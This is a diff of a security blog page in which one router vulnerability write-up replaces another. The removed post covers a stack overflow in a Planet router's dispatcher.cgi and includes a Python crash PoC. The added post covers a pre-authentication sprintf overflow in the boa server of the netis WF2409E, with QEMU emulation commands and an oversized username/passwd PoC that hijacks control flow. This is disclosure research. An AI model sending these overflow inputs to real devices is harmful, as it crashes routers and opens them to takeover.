@@ -16,28 +16,27 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="web_sys_infoContact_post_contactDuring my internship at Qi An Xin Tiangong Lab, I discovered a  stack overflow vulnerability in the Planet router. By analyzing the dispatcher file in the bin directory">
+    <meta name="description" content="Buffer Overflow in boa of netis_WF2409EPrinciple of VulnerabilityDuring my internship at Qi An Xin Tiangong Lab, I discovered a  stack overflow vulnerability in the netis_WF2409E router. sub_4110d4 is">
 <meta property="og:type" content="article">
-<meta property="og:title" content="web_sys_infoContact_post_contact">
-<meta property="og:url" content="https://lafdrew.github.io/2025/04/20/web-sys-infoContact-post-contact/index.html">
+<meta property="og:title" content="Buffer Overflow in boa of netis_WF2409E">
+<meta property="og:url" content="https://lafdrew.github.io/2025/04/25/Buffer-Overflow-in-boa-of-netis-WF2409E/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="web_sys_infoContact_post_contactDuring my internship at Qi An Xin Tiangong Lab, I discovered a  stack overflow vulnerability in the Planet router. By analyzing the dispatcher file in the bin directory">
+<meta property="og:description" content="Buffer Overflow in boa of netis_WF2409EPrinciple of VulnerabilityDuring my internship at Qi An Xin Tiangong Lab, I discovered a  stack overflow vulnerability in the netis_WF2409E router. sub_4110d4 is">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://lafdrew.github.io/res/202503211522484-17451403582571-17451485724401.png">
-<meta property="og:image" content="https://lafdrew.github.io/res/image-20250417161214516-174487753582528.png">
-<meta property="og:image" content="https://lafdrew.github.io/res/image-20250417161233948-174487755495529.png">
-<meta property="og:image" content="https://lafdrew.github.io/res/image-20250417161304980-174487758597530.png">
-<meta property="og:image" content="https://lafdrew.github.io/res/image-20250417161342222-174487762317031.png">
-<meta property="article:published_time" content="2025-04-20T09:11:54.000Z">
-<meta property="article:modified_time" content="2025-04-20T11:29:38.639Z">
+<meta property="og:image" content="https://lafdrew.github.io/res/image-20250425142156676.png">
+<meta property="og:image" content="https://lafdrew.github.io/res/65b6a1267ae9f59ca526e2b23a486a52.png">
+<meta property="og:image" content="https://lafdrew.github.io/res/ff4faca66748100cccc85aa36addeb8e.png">
+<meta property="og:image" content="https://lafdrew.github.io/res/eb26f09d82a5d9b23d33329823ea002e.png">
+<meta property="article:published_time" content="2025-04-25T06:14:31.000Z">
+<meta property="article:modified_time" content="2025-04-25T06:29:46.211Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="cve">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://lafdrew.github.io/res/202503211522484-17451403582571-17451485724401.png">
+<meta name="twitter:image" content="https://lafdrew.github.io/res/image-20250425142156676.png">
   
   
   
-  <title>web_sys_infoContact_post_contact - Hexo</title>
+  <title>Buffer Overflow in boa of netis_WF2409E - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -195,7 +194,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="web_sys_infoContact_post_contact"></span>
+            <span id="subtitle" data-typed-text="Buffer Overflow in boa of netis_WF2409E"></span>
           
         </div>
 
@@ -206,8 +205,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-04-20 17:11" pubdate>
-          April 20, 2025 pm
+        <time datetime="2025-04-25 14:14" pubdate>
+          April 25, 2025 pm
         </time>
       </span>
     
@@ -218,7 +217,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          91 words
+          47 words
         
       </span>
     
@@ -266,31 +265,31 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">web_sys_infoContact_post_contact</h1>
+            <h1 id="seo-header">Buffer Overflow in boa of netis_WF2409E</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="web-sys-infoContact-post-contact"><a href="#web-sys-infoContact-post-contact" class="headerlink" title="web_sys_infoContact_post_contact"></a>web_sys_infoContact_post_contact</h1><p>During my internship at Qi An Xin Tiangong Lab, I discovered a  stack overflow vulnerability in the Planet router.</p>
-<p>By analyzing the dispatcher file in the bin directory, I found that the function web_sys_infoContact_post  contains a stack overflow vulnerability.</p>
-<p>The stack overflow can be triggered by contact value, which leads to a strcpy stack overflow.</p>
-<p><img src="/../res/202503211522484-17451403582571-17451485724401.png" srcset="/img/loading.gif" lazyload alt="image-20250321152223389"></p>
-<p>In the main function, there is an account authentication detection. We create a cookie_0 in the tmp directory, with the content of “20 0 0”, and its function is to create a cookie with sufficient permissions to access this route.</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-number">20</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+                <h1 id="Buffer-Overflow-in-boa-of-netis-WF2409E"><a href="#Buffer-Overflow-in-boa-of-netis-WF2409E" class="headerlink" title="Buffer Overflow in boa of netis_WF2409E"></a>Buffer Overflow in boa of netis_WF2409E</h1><h2 id="Principle-of-Vulnerability"><a href="#Principle-of-Vulnerability" class="headerlink" title="Principle of Vulnerability"></a>Principle of Vulnerability</h2><p>During my internship at Qi An Xin Tiangong Lab, I discovered a  stack overflow vulnerability in the netis_WF2409E router.</p>
+<p>sub_4110d4 is the authentication logic. It concatenates the username and passwd to v5 and then compares it with sys_passwd. However, since sprintf does not perform length checking, an overflow occurs. Therefore, this is <strong>a vulnerability before authentication.</strong></p>
+<p><img src="/../res/image-20250425142156676.png" srcset="/img/loading.gif" lazyload alt="image-20250425142156676"></p>
+<h2 id="Simulate-using-QEMU"><a href="#Simulate-using-QEMU" class="headerlink" title="Simulate using QEMU."></a>Simulate using QEMU.</h2><p>Start a web service by simulating BOA with QEMU.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chroot</span> ./ ./qemu-mips-static  -L ./lib  ./bin/boa -p /web -f /etc/boa.conf<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../res/65b6a1267ae9f59ca526e2b23a486a52.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>Pass parameters</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=<span class="hljs-number">1111111111111111111111111111111111111111111111111111111</span>&amp;passwd=<span class="hljs-number">11111111111111111111111111111111111111111</span><br></code></pre></td></tr></table></figure>
 
 
 
-<p><img src="/../res/image-20250417161214516-174487753582528.png" srcset="/img/loading.gif" lazyload alt="image-20250417161214516"></p>
-<p><img src="/../res/image-20250417161233948-174487755495529.png" srcset="/img/loading.gif" lazyload alt="image-20250417161233948"></p>
-<p>Through IDA, it can be seen that the stack space is 0x118</p>
-<p>﻿The content of the <strong>poc</strong>.py file is as follows:</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs json">import os<br><br><br>a =<span class="hljs-number">0x204</span><br>var_name = <span class="hljs-string">&quot;contact&quot;</span><br>b = &#x27;a&#x27; * <span class="hljs-number">0x600</span><br><br><br>poc_content = f<span class="hljs-string">&quot;&amp;cmd=&#123;a&#125;&amp;&#123;var_name&#125;=&#123;b&#125;&quot;</span><br>with open(&#x27;poc&#x27;<span class="hljs-punctuation">,</span> &#x27;w&#x27;) as f<span class="hljs-punctuation">:</span><br>    f.write(poc_content)<br><br>command = (<br>    <span class="hljs-string">&quot;sudo chroot . ./qemu-mips-static &quot;</span><br>    <span class="hljs-string">&quot;-E REQUEST_METHOD=POST &quot;</span><br>    <span class="hljs-string">&quot;-E HTTP_COOKIE=&#x27;hid=0&#x27; &quot;</span><br>    <span class="hljs-string">&quot;-L ./lib &quot;</span><br>    <span class="hljs-string">&quot;-g 1234 &quot;</span><br>    <span class="hljs-string">&quot;./dispatcher.cgi &quot;</span><br>    <span class="hljs-string">&quot;&lt; poc&quot;</span>  <br>)<br><br><br>os.system(command)<br><br><br><br></code></pre></td></tr></table></figure>
+<p>It can be observed that the web service has crashed completely.</p>
+<p><img src="/../res/ff4faca66748100cccc85aa36addeb8e.png" srcset="/img/loading.gif" lazyload alt="ff4faca66748100cccc85aa36addeb8e"></p>
+<h2 id="Debug-using-gdb"><a href="#Debug-using-gdb" class="headerlink" title="Debug using gdb."></a>Debug using gdb.</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chroot</span> ./ ./qemu-mips-static  -L ./lib   -g 1234 ./bin/boa -p /web -f /etc/boa.conf<br></code></pre></td></tr></table></figure>
 
 
 
-<h1 id="Attack-result"><a href="#Attack-result" class="headerlink" title="Attack result"></a>Attack result</h1><p><img src="/../res/image-20250417161304980-174487758597530.png" srcset="/img/loading.gif" lazyload alt="image-20250417161304980"></p>
-<p><img src="/../res/image-20250417161342222-174487762317031.png" srcset="/img/loading.gif" lazyload alt="image-20250417161342222"></p>
-<p>Through the above image, we can see that we have overflowed to 0x4f0 and successfully hijacked the control flow. If necessary, more can be overflowed.</p>
+<p><img src="/../res/eb26f09d82a5d9b23d33329823ea002e.png" srcset="/img/loading.gif" lazyload alt="eb26f09d82a5d9b23d33329823ea002e"></p>
+<p>It can be seen that the program has overflowed and controlled the program execution flow. If necessary, more overflow can be performed to construct a ROP chain.</p>
 
                 
               </div>
@@ -315,8 +314,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>web_sys_infoContact_post_contact</div>
-      <div>https://lafdrew.github.io/2025/04/20/web-sys-infoContact-post-contact/</div>
+      <div>Buffer Overflow in boa of netis_WF2409E</div>
+      <div>https://lafdrew.github.io/2025/04/25/Buffer-Overflow-in-boa-of-netis-WF2409E/</div>
     </div>
     <div class="license-meta">
       
@@ -328,7 +327,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>April 20, 2025</div>
+          <div>April 25, 2025</div>
         </div>
       
       
@@ -360,9 +359,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/04/25/Buffer-Overflow-in-boa-of-netis-WF2409E/" title="Buffer Overflow in boa of netis_WF2409E">
+                      <a href="/2025/04/25/Buffer-Overflow-in-upload-cgi-of-iptime-nas-1-5-04/" title="Buffer Overflow in upload.cgi of iptime_nas_1.5.04">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Buffer Overflow in boa of netis_WF2409E</span>
+                        <span class="hidden-mobile">Buffer Overflow in upload.cgi of iptime_nas_1.5.04</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -370,8 +369,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/04/20/web-acl-mgmt-Rules-Edit-post-ruleEditName/" title="web_acl_mgmt_Rules_Edit_post_ruleEditName">
-                        <span class="hidden-mobile">web_acl_mgmt_Rules_Edit_post_ruleEditName</span>
+                      <a href="/2025/04/20/web-sys-infoContact-post-contact/" title="web_sys_infoContact_post_contact">
+                        <span class="hidden-mobile">web_sys_infoContact_post_contact</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
